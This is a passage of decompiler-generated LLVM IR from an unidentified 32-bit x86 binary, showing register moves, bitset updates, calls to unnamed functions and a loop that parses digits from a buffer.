  store i32 %v3_8049e5a, i32* %edx.global-to-local, align 4
  %v1_8049768 = add i32 %v3_8049754, 2
  %v9_8049768 = icmp eq i32 %v1_8049768, 0
  store i1 %v9_8049768, i1* %zf.global-to-local, align 1
  store i32 %v1_8049768, i32* %eax.global-to-local, align 4
  %v2_804976b = add i32 %v3_8049e5a, 12
  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v1_8049768, i32* %v3_804976b, align 4
  br label %dec_label_pc_804958e

dec_label_pc_8049773:                             ; preds = %dec_label_pc_804854f
  %v1_8049773 = add i32 %v0_80485a5, -1440
  %v2_8049773 = inttoptr i32 %v1_8049773 to i32*
  %v3_8049773 = load i32, i32* %v2_8049773, align 4
  %v1_804977b = urem i32 %v3_8049773, 32
  store i32 %v1_804977b, i32* %eax.global-to-local, align 4
  %v2_804977e = udiv i32 %v3_8049773, 32
  store i32 %v2_804977e, i32* %edx.global-to-local, align 4
  %v0_8049781 = load i32, i32* @esp, align 4
  %v2_8049781 = mul nuw nsw i32 %v2_804977e, 4
  %v3_8049781 = add nuw nsw i32 %v2_8049781, 20740
  %v4_8049781 = add i32 %v3_8049781, %v0_8049781
  %v5_8049781 = inttoptr i32 %v4_8049781 to i32*
  %v6_8049781 = load i32, i32* %v5_8049781, align 4
  %v9_8049781 = shl i32 1, %v1_804977b
  %v12_8049781 = or i32 %v6_8049781, %v9_8049781
  store i32 %v12_8049781, i32* %v5_8049781, align 4
  %v0_8049789 = load i32, i32* @esi, align 4
  %v1_8049789 = add i32 %v0_8049789, -1440
  %v2_8049789 = inttoptr i32 %v1_8049789 to i32*
  %v3_8049789 = load i32, i32* %v2_8049789, align 4
  store i32 %v3_8049789, i32* %eax.global-to-local, align 4
  %v1_804978f = load i32, i32* @esp, align 4
  %v2_804978f = add i32 %v1_804978f, 72
  %v3_804978f = inttoptr i32 %v2_804978f to i32*
  %v4_804978f = load i32, i32* %v3_804978f, align 4
  %v5_804978f = sub i32 %v3_8049789, %v4_804978f
  %v11_804978f = xor i32 %v4_804978f, %v3_8049789
  %v12_804978f = xor i32 %v5_804978f, %v3_8049789
  %v13_804978f = and i32 %v12_804978f, %v11_804978f
  %v14_804978f = icmp slt i32 %v13_804978f, 0
  %v15_804978f = icmp eq i32 %v5_804978f, 0
  store i1 %v15_804978f, i1* %zf.global-to-local, align 1
  %v16_804978f = icmp slt i32 %v5_804978f, 0
  %v3_8049793 = icmp ne i1 %v16_804978f, %v14_804978f
  %v4_8049793 = or i1 %v15_804978f, %v3_8049793
  br i1 %v4_8049793, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_804979e:                             ; preds = %dec_label_pc_8048c10
  %v2_804979e = add i32 %v0_8048c1d, 12
  %v3_804979e = inttoptr i32 %v2_804979e to i32*
  store i32 %v3_8048bde, i32* %v3_804979e, align 4
  %v2_804979f = add i32 %v0_8048c1d, 8
  %v3_804979f = inttoptr i32 %v2_804979f to i32*
  store i32 %v3_8048bde, i32* %v3_804979f, align 4
  %v0_80497a0 = load i32, i32* @esi, align 4
  %v2_80497a0 = add i32 %v0_8048c1d, 4
  %v3_80497a0 = inttoptr i32 %v2_80497a0 to i32*
  store i32 %v0_80497a0, i32* %v3_80497a0, align 4
  %v1_80497a1 = add i32 %v0_8048c1d, 112
  %v2_80497a1 = inttoptr i32 %v1_80497a1 to i32*
  %v3_80497a1 = load i32, i32* %v2_80497a1, align 4
  store i32 %v3_80497a1, i32* @ebx, align 4
  %v3_80497a5 = inttoptr i32 %v0_8048c1d to i32*
  store i32 %v3_80497a1, i32* %v3_80497a5, align 4
  %v3_80497a6 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80497a6, i32* %eax.global-to-local, align 4
  %v0_80497ab = load i32, i32* @esp, align 4
  %v1_80497ab = add i32 %v0_80497ab, 16
  %v6_80497ab = icmp eq i32 %v1_80497ab, 0
  store i1 %v6_80497ab, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c28

dec_label_pc_80497b3:                             ; preds = %dec_label_pc_8048d89
  %v1_80497b3 = call i32 @function_80526c9(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80497b3, i32* %eax.global-to-local, align 4
  store i32 %v1_80497b3, i32* @ebx, align 4
  br label %dec_label_pc_80497ba

dec_label_pc_80497ba:                             ; preds = %dec_label_pc_80497ed, %dec_label_pc_80497b3
  %v0_80497ba = phi i32 [ %v1_80497b3, %dec_label_pc_80497b3 ], [ %v0_80497ba.pre, %dec_label_pc_80497ed ]
  %v1_80497ba = inttoptr i32 %v0_80497ba to i32*
  store i32 0, i32* %v1_80497ba, align 4
  %v0_80497c0 = load i32, i32* @esp, align 4
  %v1_80497c0 = add i32 %v0_80497c0, -4
  %v2_80497c0 = inttoptr i32 %v1_80497c0 to i32*
  store i32 16384, i32* %v2_80497c0, align 4
  %v1_80497c5 = add i32 %v0_80497c0, -8
  %v2_80497c5 = inttoptr i32 %v1_80497c5 to i32*
  store i32 10240, i32* %v2_80497c5, align 4
  %v1_80497ca = add i32 %v0_80497c0, 131
  store i32 %v1_80497ca, i32* %ecx.global-to-local, align 4
  %v2_80497d1 = add i32 %v0_80497c0, -12
  %v3_80497d1 = inttoptr i32 %v2_80497d1 to i32*
  store i32 %v1_80497ca, i32* %v3_80497d1, align 4
  %v1_80497d2 = add i32 %v0_80497c0, 92
  %v2_80497d2 = inttoptr i32 %v1_80497d2 to i32*
  %v3_80497d2 = load i32, i32* %v2_80497d2, align 4
  store i32 %v3_80497d2, i32* %eax.global-to-local, align 4
  %v1_80497d6 = add i32 %v3_80497d2, -1452
  %v2_80497d6 = inttoptr i32 %v1_80497d6 to i32*
  %v3_80497d6 = load i32, i32* %v2_80497d6, align 4
  %v2_80497dc = add i32 %v0_80497c0, -16
  %v3_80497dc = inttoptr i32 %v2_80497dc to i32*
  store i32 %v3_80497d6, i32* %v3_80497dc, align 4
  %v0_80497dd = call i32 @function_805285e()
  store i32 %v0_80497dd, i32* %eax.global-to-local, align 4
  %v0_80497e2 = load i32, i32* @esp, align 4
  %v1_80497e2 = add i32 %v0_80497e2, 16
  %v1_80497e5 = icmp eq i32 %v0_80497dd, 0
  store i1 %v1_80497e5, i1* %zf.global-to-local, align 1
  br i1 %v1_80497e5, label %dec_label_pc_8049b04, label %dec_label_pc_80497ed

dec_label_pc_80497ed:                             ; preds = %dec_label_pc_80497ba
  %v1_80497ed = add i32 %v0_80497dd, 1
  %v8_80497ed = icmp eq i32 %v1_80497ed, 0
  store i1 %v8_80497ed, i1* %zf.global-to-local, align 1
  store i32 %v1_80497ed, i32* %eax.global-to-local, align 4
  %v1_80497ee = icmp eq i1 %v8_80497ed, false
  %v0_80497ba.pre = load i32, i32* @ebx, align 4
  br i1 %v1_80497ee, label %dec_label_pc_80497ba, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497ed
  %v1_80497f0 = inttoptr i32 %v0_80497ba.pre to i32*
  %v2_80497f0 = load i32, i32* %v1_80497f0, align 4
  %v11_80497f0 = icmp eq i32 %v2_80497f0, 11
  store i1 %v11_80497f0, i1* %zf.global-to-local, align 1
  br i1 %v11_80497f0, label %dec_label_pc_8049c31, label %dec_label_pc_80497f9

dec_label_pc_80497f9:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_8049b04
  %v0_80497f9 = phi i32 [ %v1_80497e2, %dec_label_pc_80497f0 ], [ %v0_80497f9.pre, %dec_label_pc_8049b04 ]
  %v9_80497f9 = icmp eq i32 %v0_80497f9, 12
  store i1 %v9_80497f9, i1* %zf.global-to-local, align 1
  %v1_80497fc = add i32 %v0_80497f9, 92
  %v2_80497fc = inttoptr i32 %v1_80497fc to i32*
  %v3_80497fc = load i32, i32* %v2_80497fc, align 4
  store i32 %v3_80497fc, i32* %edx.global-to-local, align 4
  %v1_8049800 = add i32 %v3_80497fc, -1452
  %v2_8049800 = inttoptr i32 %v1_8049800 to i32*
  %v3_8049800 = load i32, i32* %v2_8049800, align 4
  store i32 %v3_8049800, i32* %ecx.global-to-local, align 4
  %v2_8049806 = add i32 %v0_80497f9, -16
  %v3_8049806 = inttoptr i32 %v2_8049806 to i32*
  store i32 %v3_8049800, i32* %v3_8049806, align 4
  %v1_8049807 = call i32 @function_8052191(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8049807, i32* %eax.global-to-local, align 4
  %v0_804980c = load i32, i32* @esp, align 4
  %v1_804980c = add i32 %v0_804980c, 108
  %v2_804980c = inttoptr i32 %v1_804980c to i32*
  %v3_804980c = load i32, i32* %v2_804980c, align 4
  store i32 %v3_804980c, i32* %ecx.global-to-local, align 4
  %v6_8049810 = icmp eq i32 %v0_804980c, -16
  store i1 %v6_8049810, i1* %zf.global-to-local, align 1
  %v1_8049813 = add i32 %v3_804980c, -1452
  %v2_8049813 = inttoptr i32 %v1_8049813 to i32*
  store i32 -1, i32* %v2_8049813, align 4
  %v0_804981d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804981d = add i32 %v0_804981d, -1448
  %v2_804981d = inttoptr i32 %v1_804981d to i8*
  store i8 0, i8* %v2_804981d, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049829:                             ; preds = %dec_label_pc_8048557
  %v1_8049829 = add i32 %v0_80485a5, -1440
  %v2_8049829 = inttoptr i32 %v1_8049829 to i32*
  %v3_8049829 = load i32, i32* %v2_8049829, align 4
  %v1_8049831 = urem i32 %v3_8049829, 32
  store i32 %v1_8049831, i32* %eax.global-to-local, align 4
  %v2_8049834 = udiv i32 %v3_8049829, 32
  store i32 %v2_8049834, i32* %edx.global-to-local, align 4
  %v0_8049837 = load i32, i32* @esp, align 4
  %v2_8049837 = mul nuw nsw i32 %v2_8049834, 4
  %v3_8049837 = add nuw nsw i32 %v2_8049837, 20740
  %v4_8049837 = add i32 %v3_8049837, %v0_8049837
  %v5_8049837 = inttoptr i32 %v4_8049837 to i32*
  %v6_8049837 = load i32, i32* %v5_8049837, align 4
  %v9_8049837 = shl i32 1, %v1_8049831
  %v12_8049837 = or i32 %v6_8049837, %v9_8049837
  store i32 %v12_8049837, i32* %v5_8049837, align 4
  %v0_804983f = load i32, i32* @esi, align 4
  %v1_804983f = add i32 %v0_804983f, -1440
  %v2_804983f = inttoptr i32 %v1_804983f to i32*
  %v3_804983f = load i32, i32* %v2_804983f, align 4
  store i32 %v3_804983f, i32* %eax.global-to-local, align 4
  %v1_8049845 = load i32, i32* @esp, align 4
  %v2_8049845 = add i32 %v1_8049845, 72
  %v3_8049845 = inttoptr i32 %v2_8049845 to i32*
  %v4_8049845 = load i32, i32* %v3_8049845, align 4
  %v5_8049845 = sub i32 %v3_804983f, %v4_8049845
  %v11_8049845 = xor i32 %v4_8049845, %v3_804983f
  %v12_8049845 = xor i32 %v5_8049845, %v3_804983f
  %v13_8049845 = and i32 %v12_8049845, %v11_8049845
  %v14_8049845 = icmp slt i32 %v13_8049845, 0
  %v15_8049845 = icmp eq i32 %v5_8049845, 0
  store i1 %v15_8049845, i1* %zf.global-to-local, align 1
  %v16_8049845 = icmp slt i32 %v5_8049845, 0
  %v3_8049849 = icmp ne i1 %v16_8049845, %v14_8049845
  %v4_8049849 = or i1 %v15_8049845, %v3_8049849
  br i1 %v4_8049849, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8049854:                             ; preds = %dec_label_pc_80493fd, %dec_label_pc_80493d2
  %v1_8049854.in = phi i32 [ %v0_8049452, %dec_label_pc_80493fd ], [ %v0_80493f3, %dec_label_pc_80493d2 ]
  %v0_8049854 = load i32, i32* @edi, align 4
  %v2_8049854 = add i32 %v1_8049854.in, 12
  %v3_8049854 = inttoptr i32 %v2_8049854 to i32*
  store i32 %v0_8049854, i32* %v3_8049854, align 4
  %v0_8049855 = load i32, i32* @edi, align 4
  %v2_8049855 = add i32 %v1_8049854.in, 8
  %v3_8049855 = inttoptr i32 %v2_8049855 to i32*
  store i32 %v0_8049855, i32* %v3_8049855, align 4
  %v1_8049856 = add i32 %v1_8049854.in, 4
  %v2_8049856 = inttoptr i32 %v1_8049856 to i32*
  store i32 0, i32* %v2_8049856, align 4
  %v2_8049858 = inttoptr i32 %v1_8049854.in to i32*
  store i32 37, i32* %v2_8049858, align 4
  %v3_804985a = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804985a, i32* %eax.global-to-local, align 4
  %v0_804985f = load i32, i32* @esp, align 4
  %v9_804985f = icmp eq i32 %v0_804985f, -12
  store i1 %v9_804985f, i1* %zf.global-to-local, align 1
  %v2_8049862 = add i32 %v0_804985f, 8
  %v3_8049862 = inttoptr i32 %v2_8049862 to i32*
  store i32 %v3_804985a, i32* %v3_8049862, align 4
  %v1_8049863 = add i32 %v0_804985f, 120
  %v2_8049863 = inttoptr i32 %v1_8049863 to i32*
  %v3_8049863 = load i32, i32* %v2_8049863, align 4
  %v2_8049867 = add i32 %v0_804985f, 4
  %v3_8049867 = inttoptr i32 %v2_8049867 to i32*
  store i32 %v3_8049863, i32* %v3_8049867, align 4
  %v1_8049868 = add i32 %v0_804985f, 147
  store i32 %v1_8049868, i32* @ecx, align 4
  %v3_804986f = inttoptr i32 %v0_804985f to i32*
  store i32 %v1_8049868, i32* %v3_804986f, align 4
  %v4_8049870 = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049875 = load i32, i32* @esp, align 4
  %v1_8049875 = add i32 %v0_8049875, 16
  %v1_8049878 = add i32 %v4_8049870, 1
  %v8_8049878 = icmp eq i32 %v1_8049878, 0
  store i1 %v8_8049878, i1* %zf.global-to-local, align 1
  store i32 %v1_8049878, i32* %eax.global-to-local, align 4
  br i1 %v8_8049878, label %dec_label_pc_8049a77, label %dec_label_pc_804987f

dec_label_pc_804987f:                             ; preds = %dec_label_pc_8049854
  %v0_804987f = load i32, i32* @ebx, align 4
  %v2_804987f = add i32 %v0_8049875, 12
  %v3_804987f = inttoptr i32 %v2_804987f to i32*
  store i32 %v0_804987f, i32* %v3_804987f, align 4
  %v0_8049880 = load i32, i32* @ebx, align 4
  %v2_8049880 = add i32 %v0_8049875, 8
  %v3_8049880 = inttoptr i32 %v2_8049880 to i32*
  store i32 %v0_8049880, i32* %v3_8049880, align 4
  %v1_8049881 = add i32 %v0_8049875, 4
  %v2_8049881 = inttoptr i32 %v1_8049881 to i32*
  store i32 0, i32* %v2_8049881, align 4
  %v2_8049883 = inttoptr i32 %v0_8049875 to i32*
  store i32 37, i32* %v2_8049883, align 4
  %v3_8049885 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049885, i32* %eax.global-to-local, align 4
  %v0_804988a = load i32, i32* @esp, align 4
  %v9_804988a = icmp eq i32 %v0_804988a, -12
  store i1 %v9_804988a, i1* %zf.global-to-local, align 1
  %v2_804988d = add i32 %v0_804988a, 8
  %v3_804988d = inttoptr i32 %v2_804988d to i32*
  store i32 %v3_8049885, i32* %v3_804988d, align 4
  %v1_804988e = add i32 %v0_804988a, 120
  %v2_804988e = inttoptr i32 %v1_804988e to i32*
  %v3_804988e = load i32, i32* %v2_804988e, align 4
  store i32 %v3_804988e, i32* @ecx, align 4
  %v2_8049892 = add i32 %v0_804988a, 4
  %v3_8049892 = inttoptr i32 %v2_8049892 to i32*
  store i32 %v3_804988e, i32* %v3_8049892, align 4
  %v1_8049893 = add i32 %v0_804988a, 147
  store i32 %v1_8049893, i32* %eax.global-to-local, align 4
  %v3_804989a = inttoptr i32 %v0_804988a to i32*
  store i32 %v1_8049893, i32* %v3_804989a, align 4
  %v4_804989b = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804989b, i32* %eax.global-to-local, align 4
  %v0_80498a0 = load i32, i32* @esp, align 4
  %v6_80498a0 = icmp eq i32 %v0_80498a0, -16
  store i1 %v6_80498a0, i1* %zf.global-to-local, align 1
  store i32 %v4_804989b, i32* %ebx.global-to-local, align 4
  %v3_80498a5 = add i32 %v4_804989b, 147
  %v4_80498a5 = add i32 %v3_80498a5, %v0_80498a0
  %v5_80498a5 = inttoptr i32 %v4_80498a5 to i8*
  %v6_80498a5 = load i8, i8* %v5_80498a5, align 1
  %v12_80498a5 = icmp eq i8 %v6_80498a5, 32
  %v1_80498ad = zext i1 %v12_80498a5 to i32
  %v1_80498b0 = add i32 %v0_80498a0, 147
  store i32 %v1_80498b0, i32* %esi.global-to-local, align 4
  store i32 %v1_80498ad, i32* %eax.global-to-local, align 4
  %v1_80498bc = add i32 %v0_80498a0, 12
  %v2_80498bc = inttoptr i32 %v1_80498bc to i32*
  store i32 2, i32* %v2_80498bc, align 4
  %v1_80498be = add i32 %v0_80498a0, 8
  %v2_80498be = inttoptr i32 %v1_80498be to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_80498be, align 4
  %v0_80498c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80498c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80498c3 = add i32 %v1_80498c3, %v0_80498c3
  store i32 %v2_80498c3, i32* @ebx, align 4
  %v1_80498c5 = add i32 %v0_80498a0, 120
  %v2_80498c5 = inttoptr i32 %v1_80498c5 to i32*
  %v3_80498c5 = load i32, i32* %v2_80498c5, align 4
  %v2_80498c9 = sub i32 %v3_80498c5, %v2_80498c3
  store i32 %v2_80498c9, i32* %eax.global-to-local, align 4
  %v0_80498cb = load i32, i32* %esi.global-to-local, align 4
  %v2_80498cb = add i32 %v0_80498cb, %v2_80498c3
  %v12_80498cb = icmp eq i32 %v2_80498cb, 0
  store i1 %v12_80498cb, i1* %zf.global-to-local, align 1
  store i32 %v2_80498cb, i32* @esi, align 4
  %v2_80498cd = add i32 %v0_80498a0, 4
  %v3_80498cd = inttoptr i32 %v2_80498cd to i32*
  store i32 %v2_80498c9, i32* %v3_80498cd, align 4
  %v0_80498ce = load i32, i32* @esi, align 4
  %v3_80498ce = inttoptr i32 %v0_80498a0 to i32*
  store i32 %v0_80498ce, i32* %v3_80498ce, align 4
  %v0_80498cf = call i32 @function_8051ca0()
  store i32 %v0_80498cf, i32* %eax.global-to-local, align 4
  %v0_80498d4 = load i32, i32* @esp, align 4
  %v1_80498d4 = add i32 %v0_80498d4, 16
  store i32 %v0_80498cf, i32* @edi, align 4
  %v10_80498d9 = icmp eq i32 %v0_80498cf, -1
  store i1 %v10_80498d9, i1* %zf.global-to-local, align 1
  br i1 %v10_80498d9, label %dec_label_pc_8049a77, label %dec_label_pc_80498e2

dec_label_pc_80498e2:                             ; preds = %dec_label_pc_804987f
  %v10_80498e2 = icmp eq i32 %v0_80498cf, 1
  store i1 %v10_80498e2, i1* %zf.global-to-local, align 1
  %v7_80498e5 = icmp sgt i32 %v0_80498cf, 1
  br i1 %v7_80498e5, label %dec_label_pc_80498e7, label %dec_label_pc_80498ea

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_80498e2
  %v1_80498e7 = add i32 %v0_80498cf, -2
  %v9_80498e7 = icmp eq i32 %v1_80498e7, 0
  store i1 %v9_80498e7, i1* %zf.global-to-local, align 1
  store i32 %v1_80498e7, i32* @edi, align 4
  br label %dec_label_pc_80498ea

dec_label_pc_80498ea:                             ; preds = %dec_label_pc_80498e2, %dec_label_pc_80498e7
  %v1_80498ea = add i32 %v0_80498d4, 20920
  store i32 %v1_80498ea, i32* %eax.global-to-local, align 4
  %v1_80498f1 = add i32 %v0_80498d4, 20916
  %v2_80498f1 = inttoptr i32 %v1_80498f1 to i32*
  store i32 0, i32* %v2_80498f1, align 4
  %v0_80498fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80498fc = load i32, i32* @ebx, align 4
  %v2_80498fc = add i32 %v1_80498fc, %v0_80498fc
  %v12_80498fc = icmp eq i32 %v2_80498fc, 0
  store i1 %v12_80498fc, i1* %zf.global-to-local, align 1
  store i32 %v2_80498fc, i32* %eax.global-to-local, align 4
  %v0_80498fe = load i32, i32* @esi, align 4
  store i32 %v0_80498fe, i32* %edx.global-to-local, align 4
  %v1_8049900 = load i32, i32* @edi, align 4
  %v2_8049900 = add i32 %v2_80498fc, -20773
  %v3_8049900 = add i32 %v2_8049900, %v1_8049900
  %v4_8049900 = inttoptr i32 %v3_8049900 to i8*
  store i8 0, i8* %v4_8049900, align 1
  %v0_8049908 = load i32, i32* @esi, align 4
  %v1_8049908 = inttoptr i32 %v0_8049908 to i8*
  %v2_8049908 = load i8, i8* %v1_8049908, align 1
  %v3_8049908 = zext i8 %v2_8049908 to i32
  %v4_8049908 = load i32, i32* @ecx, align 4
  %v5_8049908 = and i32 %v4_8049908, -256
  %v6_8049908 = or i32 %v5_8049908, %v3_8049908
  store i32 %v6_8049908, i32* @ecx, align 4
  %v1_804990a = add i32 %v6_8049908, -48
  store i32 %v1_804990a, i32* %eax.global-to-local, align 4
  %v1_804990d = trunc i32 %v1_804990a to i8
  %v10_804990d = icmp eq i8 %v1_804990d, 9
  store i1 %v10_804990d, i1* %zf.global-to-local, align 1
  %tmp240 = icmp ult i8 %v1_804990d, 10
  br i1 %tmp240, label %dec_label_pc_8049911, label %dec_label_pc_8049928

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498ea
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049913

dec_label_pc_8049913:                             ; preds = %dec_label_pc_8049913, %dec_label_pc_8049911
  %v0_8049913 = phi i32 [ %v0_804991b, %dec_label_pc_8049913 ], [ 0, %dec_label_pc_8049911 ]
  %v1_8049913 = add i32 %v0_8049913, 1
  %v8_8049913 = icmp eq i32 %v1_8049913, 0
  store i1 %v8_8049913, i1* %zf.global-to-local, align 1
  store i32 %v1_8049913, i32* %edx.global-to-local, align 4
  %v1_8049914 = load i32, i32* @esp, align 4
  %v2_8049914 = add i32 %v1_8049914, 20900
  %v3_8049914 = inttoptr i32 %v2_8049914 to i32*
  store i32 %v1_8049913, i32* %v3_8049914, align 4
  %v0_804991b = load i32, i32* %edx.global-to-local, align 4
  %v1_804991b = load i32, i32* @esi, align 4
  %v2_804991b = add i32 %v1_804991b, %v0_804991b
  %v3_804991b = inttoptr i32 %v2_804991b to i8*
  %v4_804991b = load i8, i8* %v3_804991b, align 1
  %v5_804991b = zext i8 %v4_804991b to i32
  %v6_804991b = load i32, i32* @ecx, align 4
  %v7_804991b = and i32 %v6_804991b, -256
  %v8_804991b = or i32 %v7_804991b, %v5_804991b
  store i32 %v8_804991b, i32* @ecx, align 4
  %v1_804991e = add i32 %v8_804991b, -48
  store i32 %v1_804991e, i32* %eax.global-to-local, align 4
  %v1_8049921 = trunc i32 %v1_804991e to i8
  %v10_8049921 = icmp eq i8 %v1_8049921, 9
  store i1 %v10_8049921, i1* %zf.global-to-local, align 1
  %tmp241 = icmp ult i8 %v1_8049921, 10
  br i1 %tmp241, label %dec_label_pc_8049913, label %dec_label_pc_8049925

dec_label_pc_8049925:                             ; preds = %dec_label_pc_8049913
  store i32 %v2_804991b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049928

dec_label_pc_8049928:                             ; preds = %dec_label_pc_80498ea, %dec_label_pc_8049925
  %v0_8049928 = phi i32 [ %v6_8049908, %dec_label_pc_80498ea ], [ %v8_804991b, %dec_label_pc_8049925 ]
  %v3_8049928 = trunc i32 %v0_8049928 to i8
  %v4_8049928 = icmp eq i8 %v3_8049928, 0
  store i1 %v4_8049928, i1* %zf.global-to-local, align 1
  br i1 %v4_8049928, label %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, label %dec_label_pc_8049930

dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge: ; preds = %dec_label_pc_8049928
  %v0_8049a77.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a77

dec_label_pc_8049930:                             ; preds = %dec_label_pc_8049928
  %v0_8049930 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049930 = inttoptr i32 %v0_8049930 to i8*
  store i8 0, i8* %v1_8049930, align 1
  %v0_8049933 = load i32, i32* @esp, align 4
  %v1_8049933 = add i32 %v0_8049933, 20900
  %v2_8049933 = inttoptr i32 %v1_8049933 to i32*
  %v3_8049933 = load i32, i32* %v2_8049933, align 4
  store i32 %v3_8049933, i32* %edx.global-to-local, align 4
  %v1_804993a = add i32 %v3_8049933, 1
  store i32 %v1_804993a, i32* %eax.global-to-local, align 4
  store i32 %v1_804993a, i32* %v2_8049933, align 4
  %v0_8049944 = load i32, i32* @esi, align 4
  %v1_8049944 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049944 = add i32 %v1_8049944, %v0_8049944
  %v3_8049944 = inttoptr i32 %v2_8049944 to i8*
  %v4_8049944 = load i8, i8* %v3_8049944, align 1
  %v10_8049944 = icmp eq i8 %v4_8049944, 32
  store i1 %v10_8049944, i1* %zf.global-to-local, align 1
  br i1 %v10_8049944, label %dec_label_pc_8049ee6, label %dec_label_pc_804994e

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049930, %dec_label_pc_8049ee6
  %v0_8049951 = phi i32 [ %v0_8049944, %dec_label_pc_8049930 ], [ %v0_8049951.pre, %dec_label_pc_8049ee6 ]
  %v0_804994e = load i32, i32* @esp, align 4
  store i32 %v0_8049951, i32* %eax.global-to-local, align 4
  %v1_8049953 = add i32 %v0_804994e, 20900
  %v2_8049953 = inttoptr i32 %v1_8049953 to i32*
  %v3_8049953 = load i32, i32* %v2_8049953, align 4
  store i32 %v3_8049953, i32* %edx.global-to-local, align 4
  %v2_804995a = add i32 %v3_8049953, %v0_8049951
  %v12_804995a = icmp eq i32 %v2_804995a, 0
  store i1 %v12_804995a, i1* %zf.global-to-local, align 1
  store i32 %v2_804995a, i32* %eax.global-to-local, align 4
  %v2_804995c = add i32 %v0_804994e, -16
  %v3_804995c = inttoptr i32 %v2_804995c to i32*
  store i32 %v2_804995a, i32* %v3_804995c, align 4
  %v2_804995d = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_804995d, i32* %eax.global-to-local, align 4
  %v0_8049962 = load i32, i32* @esp, align 4
  %v1_8049965 = add i32 %v0_8049962, 8
  %v2_8049965 = inttoptr i32 %v1_8049965 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054ad0.17 to i32), i32* %v2_8049965, align 4
  %v2_804996a = add i32 %v0_8049962, 4
  %v3_804996a = inttoptr i32 %v2_804996a to i32*
  store i32 %v2_804995d, i32* %v3_804996a, align 4
  %v1_804996b = add i32 %v0_8049962, 20916
  %v2_804996b = inttoptr i32 %v1_804996b to i32*
  %v3_804996b = load i32, i32* %v2_804996b, align 4
  store i32 %v3_804996b, i32* @ebp, align 4
  %v0_8049972 = load i32, i32* @esi, align 4
  %v2_8049974 = add i32 %v0_8049972, %v3_804996b
  %v12_8049974 = icmp eq i32 %v2_8049974, 0
  store i1 %v12_8049974, i1* %zf.global-to-local, align 1
  store i32 %v2_8049974, i32* %eax.global-to-local, align 4
  %v3_8049976 = inttoptr i32 %v0_8049962 to i32*
  store i32 %v2_8049974, i32* %v3_8049976, align 4
  %v4_8049977 = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804997c = load i32, i32* @esp, align 4
  %v1_804997c = add i32 %v0_804997c, 16
  %v1_804997f = add i32 %v4_8049977, 1
  %v8_804997f = icmp eq i32 %v1_804997f, 0
  store i1 %v8_804997f, i1* %zf.global-to-local, align 1
  store i32 %v1_804997f, i32* %eax.global-to-local, align 4
  br i1 %v8_804997f, label %dec_label_pc_80499c3, label %dec_label_pc_8049982

dec_label_pc_8049982:                             ; preds = %dec_label_pc_804994e
  %v0_8049985 = load i32, i32* @esi, align 4
  store i32 %v0_8049985, i32* %eax.global-to-local, align 4
  %v1_8049987 = add i32 %v0_804997c, 20916
  %v2_8049987 = inttoptr i32 %v1_8049987 to i32*
  %v3_8049987 = load i32, i32* %v2_8049987, align 4
  %v2_804998e = add i32 %v3_8049987, %v0_8049985
  %v12_804998e = icmp eq i32 %v2_804998e, 0
  store i1 %v12_804998e, i1* %zf.global-to-local, align 1
  store i32 %v2_804998e, i32* %eax.global-to-local, align 4
  %v3_8049990 = inttoptr i32 %v0_804997c to i32*
  store i32 %v2_804998e, i32* %v3_8049990, align 4
  %v2_8049991 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049991, i32* %eax.global-to-local, align 4
  %v0_8049996 = load i32, i32* @esp, align 4
  %v1_8049999 = add i32 %v0_8049996, 8
  %v2_8049999 = inttoptr i32 %v1_8049999 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054ad0.17 to i32), i32* %v2_8049999, align 4
  %v2_804999e = add i32 %v0_8049996, 4
  %v3_804999e = inttoptr i32 %v2_804999e to i32*
  store i32 %v2_8049991, i32* %v3_804999e, align 4
  %v1_804999f = add i32 %v0_8049996, 20916
  %v2_804999f = inttoptr i32 %v1_804999f to i32*
  %v3_804999f = load i32, i32* %v2_804999f, align 4
  store i32 %v3_804999f, i32* @ecx, align 4
  %v0_80499a6 = load i32, i32* @esi, align 4
  %v2_80499a8 = add i32 %v0_80499a6, %v3_804999f
  %v12_80499a8 = icmp eq i32 %v2_80499a8, 0
  store i1 %v12_80499a8, i1* %zf.global-to-local, align 1
  store i32 %v2_80499a8, i32* %eax.global-to-local, align 4
  %v3_80499aa = inttoptr i32 %v0_8049996 to i32*
  store i32 %v2_80499a8, i32* %v3_80499aa, align 4
